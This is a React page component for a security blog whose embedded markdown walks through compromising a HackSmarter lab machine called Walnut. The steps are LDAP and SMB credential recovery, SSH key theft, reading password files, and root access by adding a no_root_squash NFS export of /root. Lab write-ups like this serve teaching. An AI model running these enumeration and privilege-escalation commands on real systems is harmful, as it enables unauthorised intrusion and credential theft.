import React, { useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { FaArrowLeft, FaCalendar, FaServer, FaStar, FaDesktop, FaNetworkWired, FaCopy, FaCheck } from 'react-icons/fa';
import TableOfContents from '../../../components/TableOfContents';
import InfoStatus from '../../../components/InfoStatus';
import ScrollToTop from '../../../components/ScrollToTop';
import DynamicSEO from '../../../components/DynamicSEO';
import './WalnutWalkthrough.css';

const WalnutWalkthrough = () => {
  const navigate = useNavigate();

  const CodeBlock = ({ language, children }) => {
    const [copied, setCopied] = useState(false);

    const handleCopy = async () => {
      try {
        await navigator.clipboard.writeText(children);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
      } catch (err) {
        console.error('Failed to copy text: ', err);
      }
    };

    const displayLanguage = language === 'bash' ? 'Shell' : language;
    const showPrompt = language === 'bash' || language === 'shell';

    return (
      <div className="code-block-container">
        <div className="code-block-header">
          <span className="code-block-language">{displayLanguage || 'Terminal'}</span>
          <button
            className={'copy-button ' + (copied ? 'copied' : '')}
            onClick={handleCopy}
            title={copied ? 'Copied!' : 'Copy to clipboard'}
          >
            {copied ? <FaCheck /> : <FaCopy />}
          </button>
        </div>
        <pre>
          <code className={'terminal-code ' + (language ? 'language-' + language : '')}>
            {showPrompt && <span className="terminal-prompt">$ </span>}
            {children}
          </code>
        </pre>
      </div>
    );
  };

  const parseInlineMarkdown = (text) => {
    const parts = [];
    let lastIndex = 0;
    let key = 0;

    const regex = /(\[.*?\]\(.*?\)|\*\*.*?\*\*|\*.*?\*|`.*?`)/g;
    let match;

    while ((match = regex.exec(text)) !== null) {
      if (match.index > lastIndex) {
        parts.push(text.substring(lastIndex, match.index));
      }

      const matched = match[0];

      if (matched.startsWith('[') && matched.includes('](')) {
        const linkMatch = matched.match(/\[(.*?)\]\((.*?)\)/);
        if (linkMatch) {
          const [, linkText, linkUrl] = linkMatch;
          parts.push(
            <a key={key++} href={linkUrl} target="_blank" rel="noopener noreferrer" className="content-link">
              {linkText}
            </a>
          );
        }
      } else if (matched.startsWith('**') && matched.endsWith('**')) {
        parts.push(<strong key={key++}>{matched.slice(2, -2)}</strong>);
      } else if (matched.startsWith('*') && matched.endsWith('*')) {
        parts.push(<em key={key++}>{matched.slice(1, -1)}</em>);
      } else if (matched.startsWith('`') && matched.endsWith('`')) {
        parts.push(<code key={key++} className="inline-code">{matched.slice(1, -1)}</code>);
      }

      lastIndex = regex.lastIndex;
    }

    if (lastIndex < text.length) {
      parts.push(text.substring(lastIndex));
    }

    return parts.length > 0 ? parts : text;
  };

  const writeup = {
    id: 'walnut-walkthrough',
    title: 'Walnut Walkthrough',
    excerpt: 'Walnut is an easy difficulty Linux machine from HackSmarter. Provided credentials authenticate as Guest over SMB, revealing an automation share. LDAP enumeration with the assumed-breach account exposes an old password for the automation user, granting access to an SSH private key stored in the SMB share. On the machine, a custom script stores user passwords in MD5-hashed files, enabling lateral movement to localjob3. Privilege escalation exploits an ACL write on /etc/exports combined with sudo restart of the NFS server, allowing a no_root_squash mount of /root from the attacker machine.',
    date: 'Sep 01, 2026',
    tags: ['Hs', 'Linux', 'Smb', 'Ldap', 'NFS'],
    difficulty: 'Easy',
    os: 'Linux',
    ip: '10.1.161.112',
    content: `## Overview
Walnut is an **easy** difficulty Linux machine from **HackSmarter**, presented as an assumed-breach scenario with provided credentials for \`larryburns\`. The attack begins by authenticating against SMB, where the user is mapped as Guest. RPC null session enumeration reveals an \`automation\` service account, and an authenticated LDAP query with the provided credentials exposes this account's old password stored in the directory. Using this password to access the \`automation\` SMB share yields an SSH private key, granting shell access. On the machine, a custom bash script (\`runScript.sh\`) executes \`su\` for local users with passwords stored in files named by the MD5 hash of each username. Reading these files and authenticating as \`localjob3\` reveals \`sudo\` access to restart the NFS server. Combined with an ACL granting write permission on \`/etc/exports\`, this allows adding a \`no_root_squash\` export of \`/root\` and mounting it from the attacker machine as root for full compromise.

## Enumeration
### Port Scanning
Running \`Nmap\` against the target reveals several services typical of a Linux server providing directory and file sharing services, including SSH (22), RPC (111), Samba (139/445), LDAP (389), and NFS (2049):
\`\`\`bash
nmap -v -sS -sV -sC -Pn -n -p- --min-rate=10000 -oN log.nmap 10.1.161.112

PORT      STATE SERVICE      REASON         VERSION
22/tcp    open  ssh          syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a1:50:1d:04:de:66:51:74:29:2d:8e:87:af:5d:7d:17 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDAe2OGwLE70VoJDOkmnOr88x5SbEbR7mN7xhBqklK0Eyhcd9Edl4BwWaZmZ04fp2XG5bcRYfVYvD6LCxNDXSQk=
|   256 4a:db:47:8c:fa:61:66:2e:22:e5:df:da:bb:b3:ce:c5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIrrcUB1RZkqREz6oXnJ6JoTHvvkQfCehxAricf5Lelq
111/tcp   open  rpcbind      syn-ack ttl 62 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      35593/tcp   mountd
|   100005  1,2,3      37703/udp6  mountd
|   100005  1,2,3      47065/tcp6  mountd
|_  100005  1,2,3      56073/udp   mountd
139/tcp   open  netbios-ssn? syn-ack ttl 62
389/tcp   open  ldap?        syn-ack ttl 62
| fingerprint-strings:
|   LDAPSearchReq:
|_    authentication required
445/tcp   open  netbios-ssn  syn-ack ttl 62 Samba smbd 4
2049/tcp  open  nfs          syn-ack ttl 62 3-4 (RPC #100003)
35593/tcp open  mountd       syn-ack ttl 62 1-3 (RPC #100005)
36871/tcp open  nlockmgr     syn-ack ttl 62 1-4 (RPC #100021)
37263/tcp open  mountd       syn-ack ttl 62 1-3 (RPC #100005)
46119/tcp open  mountd       syn-ack ttl 62 1-3 (RPC #100005)
55149/tcp open  status       syn-ack ttl 62 1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s
| smb2-time:
|   date: 2026-09-01T18:11:15
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| nbstat: NetBIOS name: WALNUT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   WALNUT<00>           Flags: <unique><active>
|   WALNUT<03>           Flags: <unique><active>
|   WALNUT<20>           Flags: <unique><active>
|   \\x01\\x02__MSBROWSE__\\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
\`\`\`

We can see some important open ports:
• **Port 22**: SSH service running OpenSSH 9.6p1
• **Port 111**: RPC service for NFS/mountd coordination
• **Port 139/445**: Samba file sharing services
• **Port 389**: LDAP directory service (authentication required)
• **Port 2049**: NFS file system service
• **Port 35593**: NFS mountd service

Adding the domain into the hosts file.
\`\`\`bash
echo '10.1.161.112 walnut.local' | sudo tee -a /etc/hosts
\`\`\`

### SMB Enumeration
Starting with the provided credentials for \`larryburns\`, a netexec SMB check confirms the user authenticates but is mapped as **Guest**. The share listing reveals \`print$\`, \`automation\`, and \`IPC$\`:
\`\`\`bash
nxc smb 10.1.161.112 -u 'larryburns' -p 'IloveMontgommery!' --shares
\`\`\`
![netexec SMB enumeration showing larryburns mapped as Guest with automation share visible](/images/writeups/walnut/2.png)

### RPC Enumeration
An RPC null session against the target reveals a single domain user: \`automation\`. This account likely manages automated tasks on the server:
\`\`\`bash
rpcclient -U '' -N 10.1.161.112 -c 'enumdomusers; querydispinfo'
\`\`\`
![rpcclient null session revealing automation user account](/images/writeups/walnut/3.png)

### LDAP Enumeration
Using the \`larryburns\` credentials for an authenticated LDAP bind, a full directory search exposes detailed information about the \`automation\` account. The bind DN uses \`ou=People\` because this is a Linux machine running OpenLDAP, not a Windows Active Directory domain. On Linux, OpenLDAP stores user entries under \`ou=People\` by convention, while AD uses \`CN=Users\` or custom OUs. Most importantly, the LDAP entry contains a **description field with an old password** for the automation user:
\`\`\`bash
ldapsearch -x -H ldap://10.1.161.112 -D "uid=larryburns,ou=People,dc=walnut,dc=local" -w 'IloveMontgommery!' -b "dc=walnut,dc=local"
\`\`\`
![LDAP search results showing automation user entry](/images/writeups/walnut/4.png)
![LDAP search revealing automation old password in description field](/images/writeups/walnut/5.png)

## Foothold
### Accessing the Automation Share
The old password found in LDAP still works for SMB access. A quick netexec check confirms valid credentials for the \`automation\` account against the \`automation\` share:
\`\`\`bash
nxc smb 10.1.161.112 -u 'automation' -p 'asdh023incasdahff9' --shares
\`\`\`
![netexec confirming automation credentials are valid with share access](/images/writeups/walnut/6.png)

Connecting to the share with smbclient reveals the automation user's home directory contents, including a \`.ssh\` folder:
\`\`\`bash
smbclient //10.1.161.112/automation -U 'automation%asdh023incasdahff9'
\`\`\`
![smbclient browsing the automation share showing .ssh directory](/images/writeups/walnut/7.png)

### SSH Access
Downloading the private key from the \`.ssh\` directory and connecting via SSH grants a shell as the \`automation\` user:
\`\`\`bash
smbclient //10.1.161.112/automation -U 'automation%asdh023incasdahff9' -c 'cd .ssh; get id_rsa'
chmod 600 id_rsa
ssh -i id_rsa automation@10.1.161.112
\`\`\`
![SSH shell as automation user on walnut](/images/writeups/walnut/8.png)

### Understanding runScript.sh
Exploring the automation user's home directory reveals a \`scripts\` folder containing \`runScript.sh\`. This script takes a username and a command as arguments, computes the MD5 hash of the username, and uses it to look up a password file in \`/home/automation/.hidden/\`. It then runs \`su\` as that user, piping the password from the file:
\`\`\`bash
cat /home/automation/scripts/runScript.sh
\`\`\`
![runScript.sh contents showing su with MD5-based password file lookup](/images/writeups/walnut/9.png)

Checking \`/etc/passwd\` reveals four local job accounts: \`localjob1\` through \`localjob4\`:
\`\`\`bash
cat /etc/passwd
\`\`\`
![/etc/passwd showing localjob1 through localjob4 accounts](/images/writeups/walnut/10.png)

### Cracking the Password Scheme
The script's logic is straightforward: for each user, it computes \`echo -n "username" | md5sum\` and reads the password from a file with that hash as its name in \`.hidden/\`. Computing the MD5 hashes and reading the corresponding password files maps each account to its credentials:
\`\`\`bash
echo -n "localjob1" | md5sum
echo -n "localjob2" | md5sum
echo -n "localjob3" | md5sum
echo -n "localjob4" | md5sum
\`\`\`

The password files reveal credentials for all four accounts. Notably, \`localjob3\`'s main password file is empty, but a \`.bak\` backup file contains the actual password:
| User      | Password             |
|-----------|----------------------|
| localjob1 | brYfZknjTirtrPgM8V65 |
| localjob2 | cKvFZVPbrxEqCkCLPM70 |
| localjob3 | vyZzRcreRGDjbq9t19Tb |
| localjob4 | Q8NPUgCvuBQ636tzFBh3 |

Authenticating as \`localjob1\` with the recovered password confirms the scheme works:
\`\`\`bash
su localjob1
\`\`\`
![Successful su to localjob1 with recovered password](/images/writeups/walnut/11.png)

### Pivoting to localjob3
Using the backup password to switch to \`localjob3\` and checking sudo privileges reveals a critical permission: \`localjob3\` can restart the \`nfs-kernel-server\` service as root without a password:
\`\`\`bash
su localjob3
sudo -l
\`\`\`
![su to localjob3 and sudo -l showing NFS server restart privilege](/images/writeups/walnut/12.png)

## Privilege Escalation
### NFS Configuration Abuse
The sudo privilege to restart NFS alone isn't enough for escalation. However, checking the ACL on \`/etc/exports\` reveals that \`localjob3\` has **write permission** on the NFS configuration file:
\`\`\`bash
getfacl /etc/exports
\`\`\`
![getfacl showing localjob3 has rw- ACL on /etc/exports](/images/writeups/walnut/13.png)

This is the full attack path: write a new export entry that shares \`/root\` with \`no_root_squash\` (allowing the remote root user to retain UID 0 privileges on the mount), then use the sudo privilege to restart the NFS server and apply the new configuration:
\`\`\`bash
echo "/root *(rw,sync,no_subtree_check,no_root_squash)" >> /etc/exports
sudo /usr/bin/systemctl restart nfs-kernel-server.service
\`\`\`
![Adding no_root_squash export for /root and restarting NFS](/images/writeups/walnut/14.png)

### Mounting /root
Confirming the new export is active with \`showmount\`:
\`\`\`bash
showmount -e 10.1.161.112
\`\`\`
![showmount confirming /root is now exported](/images/writeups/walnut/15.png)

From the attacker machine, mounting the NFS share as root grants full access to the \`/root\` directory, completing the compromise:
\`\`\`bash
sudo mount -t nfs -o vers=3,nolock 10.1.161.112:/root /tmp/nfs
\`\`\`
![NFS mount of /root as root user, accessing root flag](/images/writeups/walnut/16.png)

## Conclusion
Walnut is an easy-difficulty Linux machine that demonstrates a realistic attack chain combining multiple enumeration vectors with a creative privilege escalation path. The machine showcases how assumed-breach credentials can be leveraged to enumerate directory services, recover additional credentials, and ultimately chain together file ACL misconfigurations with service restart privileges for full system compromise.

The attack path involved:

• **SMB Guest Enumeration**: Using provided credentials to discover available shares and identify the \`automation\` service account
• **LDAP Credential Recovery**: Authenticated LDAP queries exposing an old password stored in the \`automation\` account's description field
• **SSH Key Extraction**: Accessing the \`automation\` SMB share with the recovered password to download an SSH private key
• **Password File Analysis**: Reverse-engineering the \`runScript.sh\` password scheme by computing MD5 hashes of usernames and reading their corresponding password files
• **NFS no_root_squash Exploitation**: Combining \`localjob3\`'s file ACL write on \`/etc/exports\` with sudo NFS restart to export \`/root\` without root squashing, then mounting it from the attacker as UID 0

**Tools Used**: Nmap, NetExec (nxc), rpcclient, ldapsearch, smbclient, SSH, showmount
`};

  return (
    <>
      <DynamicSEO
        type="writeup"
        data={{
          title: writeup.title,
          excerpt: writeup.excerpt,
          id: writeup.id,
          image_url: '/images/writeups/walnut/machine.png',
          os_type: writeup.os,
          difficulty: writeup.difficulty,
          tags: writeup.tags
        }}
      />
      <motion.div
        className="writeup-detail-page"
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.6 }}
      >
      <div className="writeup-header">
        <Link to="/writeups" className="back-button">
          <FaArrowLeft />
          <span>Back to Writeups</span>
        </Link>

        <motion.div
          className="writeup-title-section"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2, duration: 0.6 }}
        >
          <h1 id="writeup-title">{writeup.title}</h1>

          <div className="writeup-meta">
            <div className="meta-item">
              <FaCalendar />
              <span>{writeup.date}</span>
            </div>
          </div>

          <div className="writeup-tags">
            {writeup.tags.map((tag, index) => (
              <motion.span
                key={tag}
                className="tag-badge"
                initial={{ scale: 0, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                transition={{ delay: 0.3 + index * 0.1, duration: 0.3 }}
                whileHover={{ scale: 1.1 }}
                style={{ cursor: 'pointer' }}
                onClick={() => navigate(`/tags/${String(tag).toLowerCase()}`)}
              >
                {tag}
              </motion.span>
            ))}
          </div>

          <div className="machine-info">
            <div className="machine-info-content">
              <div className="machine-info-left">
                <h6><FaServer /> Machine Information:</h6>
                <div className="machine-info-vertical">
                  <div className="info-item">
                    <FaDesktop /> OS:
                    <img
                      src={`/os-icons/${writeup.os}.png`}
                      alt={`${writeup.os} Icon`}
                      className="os-icon"
                      onError={(e) => {
                        e.target.style.display = 'none';
                      }}
                    />
                  </div>
                  <div className="info-item">
                    <FaStar /> Difficulty: {writeup.difficulty}
                  </div>
                  <div className="info-item">
                    <FaNetworkWired /> IP: {writeup.ip}
                  </div>
                </div>
              </div>
              <div className="machine-info-right">
                <img src="/images/writeups/walnut/machine.png" alt="Walnut" className="machine-image" />
              </div>
            </div>
          </div>

          <div className="markdown-content">
            {(() => {
              const lines = writeup.content.split('\n');
              const elements = [];
              let i = 0;

              while (i < lines.length) {
                const line = lines[i];

                if (line.startsWith('# ')) {
                  elements.push(<h1 key={i}>{parseInlineMarkdown(line.substring(2))}</h1>);
                } else if (line.startsWith('## ')) {
                  elements.push(<h2 key={i}>{parseInlineMarkdown(line.substring(3))}</h2>);
                } else if (line.startsWith('### ')) {
                  elements.push(<h3 key={i}>{parseInlineMarkdown(line.substring(4))}</h3>);
                } else if (line.startsWith('```')) {
                  const language = line.substring(3).trim();
                  const codeLines = [];
                  i++;

                  while (i < lines.length && !lines[i].startsWith('```')) {
                    codeLines.push(lines[i]);
                    i++;
                  }

                  elements.push(
                    <CodeBlock key={i} language={language}>
                      {codeLines.join('\n')}
                    </CodeBlock>
                  );
                } else if (line.startsWith('![')) {
                  const match = line.match(/!\[(.*?)\]\((.*?)\)/);
                  if (match) {
                    const [, alt, src] = match;
                    elements.push(
                      <div key={i} className="image-container">
                        <img src={src} alt={alt} className="content-image" />
                      </div>
                    );
                  }
                } else if (line.startsWith('<InfoStatus')) {
                  const titleMatch = line.match(/title="([^"]*)"/);
                  const messageMatch = line.match(/message="([^"]*)"/);
                  if (titleMatch && messageMatch) {
                    elements.push(
                      <InfoStatus
                        key={i}
                        title={titleMatch[1]}
                        message={messageMatch[1]}
                      />
                    );
                  }
                } else if (line.startsWith('|')) {
                  const tableRows = [];
                  while (i < lines.length && lines[i].startsWith('|')) {
                    tableRows.push(lines[i]);
                    i++;
                  }
                  i--;

                  const headerCells = tableRows[0].split('|').filter(c => c.trim());
                  const dataRows = tableRows.slice(2);

                  elements.push(
                    <div key={i} style={{ overflowX: 'auto', margin: '1rem 0' }}>
                      <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.9rem' }}>
                        <thead>
                          <tr>
                            {headerCells.map((cell, ci) => (
                              <th key={ci} style={{ padding: '0.5rem 1rem', borderBottom: '2px solid var(--border-color)', textAlign: 'left', color: 'var(--text-primary)' }}>
                                {cell.trim()}
                              </th>
                            ))}
                          </tr>
                        </thead>
                        <tbody>
                          {dataRows.map((row, ri) => (
                            <tr key={ri}>
                              {row.split('|').filter(c => c.trim()).map((cell, ci) => (
                                <td key={ci} style={{ padding: '0.5rem 1rem', borderBottom: '1px solid var(--border-color)', color: 'var(--text-secondary)', fontFamily: ci > 0 ? "'Courier New', monospace" : 'inherit' }}>
                                  {parseInlineMarkdown(cell.trim())}
                                </td>
                              ))}
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  );
                } else if (line.trim()) {
                  elements.push(<p key={i}>{parseInlineMarkdown(line)}</p>);
                } else {
                  elements.push(<br key={i} />);
                }

                i++;
              }

              return elements;
            })()}
          </div>
        </motion.div>
      </div>

      <TableOfContents content={writeup.content} title={writeup.title} />

      <ScrollToTop />
      </motion.div>
    </>
  );
};

export default WalnutWalkthrough;
